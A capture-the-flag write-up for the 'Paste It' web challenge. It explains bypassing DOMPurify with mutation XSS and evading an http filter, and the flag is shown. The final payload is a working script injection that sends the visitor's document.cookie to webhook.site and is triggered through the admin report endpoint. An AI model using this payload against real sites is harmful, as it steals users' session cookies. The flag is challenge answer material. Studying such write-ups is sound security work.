# Paste It
> I made my own "Pastebin", its called "Paste It". It's 100% Free and 101% Secure. What you waiting for? share your paste to your friend right now!.

## About the Challenge
Provided the website along with the source code (You can get the source code [here](web_pasteit.zip)). The website has a function to enter a link that will be shared, and later our input results can be shared with other people


[Image extracted text: Paste
links
and
text together!
Nrite
here
http: / /example. com
Submit]


## How to Solve?
After checking the source code there is `DOMPurify` which makes us unable to enter the XSS payload directly into the form. This can be bypassed by referring to this [website](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

Then there is also a filter if the input contains the string `http` or `www.` Then it will be replaced with `a` tag. but this can still be bypassed by separating between `http` or using a double slash `//`


[Image extracted text: module.exports
makeHyperLink(text )
check if text contains
link
if(text.includes("http'
text.includes( "WWW .
if it
does,
return the text with the link wrapped in
an
anchor
return text replace( / (http]www. ) |S+/g,
match)
F>
<a
class-"text-blue
600 underline" href_"
{match}">f{match}</a>
return text;
tag]


So the final payload is:
```
<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=1
onerror=window.location.replace('htt'+'ps://webhook.site/?test='+document.cookie)>;">
```

And then after XSS payload works successfully, then give an `id` to the admin by requesting the endpoint `/api/report` with the body `id`


[Image extracted text: router.post( ' /api/report
async (req,
res)
27
const
id
req.body;
if (id)
await bot.reportPaste(id)
then(
=>
res. send
"message
"Paste reported.
Admin will
check it
soon.
success"
"true'
}) )
catch(e
res.status
404`
send(response(
An
error occurred
else {
return
res.status(401
send(response
'Please fill out all the required fields! '));
catch (error_
return
res.status(500) . send(response( ' Internal
server
error' ) )
try]


Check the webhook and there will be a flag on `Request Details`


[Image extracted text: Request Details
Permalink
Raw content
Expont as-
GET
https Ilwebhook site/ZbbegOae-7e2d-4754-8dfd-aa2f03f9a16e/?test-flag-ARA2023{proTot
yp3_pOIIUt1On_g4Dg3t_t0_93t_XSS}
Host
103.152.242.116 whois
Date
02/26/2023 10.29.27 AM
9 hours ago)
Size
bytes
7305648e-ae7a-4aa6-bb08-d7cOTateOe01
Files]


```
ARA2023{pr07otyp3_p0llUt10n_g4Dg3t_t0_g3t_XSS}
```